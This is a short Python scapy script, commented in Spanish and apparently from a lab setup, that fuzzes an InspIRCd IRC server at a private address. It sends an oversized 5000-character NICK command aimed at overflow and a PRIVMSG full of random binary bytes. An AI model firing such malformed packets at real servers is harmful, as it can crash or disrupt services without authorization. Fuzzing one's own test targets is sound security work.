from scapy.all import IP, TCP, send
import random

#La ip del inspircd
TARGET_IP = "172.19.0.2" 
TARGET_PORT = 6667

def tcp_fuzz_attack():
    #Fuzzing 1: NICK tremeeeeeeendo (Desbordar)
    huge_nick = "NICK " + ("A" * 5000) + "\r\n"
    pkt1 = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT, flags="PA")/huge_nick
    send(pkt1, verbose=False)
    print("[+] Fuzzing 1 enviado (NICK gigante)")

    #Fuzzing 2: Chars binarios aleatorios
    junk_data = bytes([random.randint(0, 255) for _ in range(100)])
    bad_payload = b"PRIVMSG #general :" + junk_data + b"\r\n"
    pkt2 = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT, flags="PA")/bad_payload
    send(pkt2, verbose=False)
    print("[+] Fuzzing 2 enviado (Payload binario aleatorio)")

tcp_fuzz_attack()